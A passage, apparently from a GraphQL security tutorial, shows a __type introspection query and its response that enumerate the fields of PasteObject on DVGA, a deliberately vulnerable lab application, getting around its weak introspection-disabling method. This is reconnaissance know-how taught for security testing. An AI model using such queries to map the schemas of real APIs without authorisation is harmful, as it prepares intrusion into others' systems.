insight into the application’s schema: namely, stuffing potential type names into the __type field’s name argument.

Let’s take advantage of DVGA’s poor introspection-disabling method to get a list of fields from its schema by sending the following __type introspection query for PasteObject:

```
{
  __type(name:"PasteObject") {
    name
    fields {
      name
    }
  }
}
```

The response for this query should provide us with a list of all field names in the PasteObject type:

```
{
  "data": {
    "__type": {
      "name": "PasteObject",
      "fields": [
        {
          "name": "id"
        },
        {
          "name": "title"
        },
        {
          "name": "content"
        },
        {
          "name": "public"
        },
        {
          "name": "userAgent"
        },
        {
          "name": "ipAddr"
        },
        {
          "name": "ownerId"
        },
        {
          "name": "burn"
        },
        {
          "name": "owner"
        }
      ]
    }
  }
}
```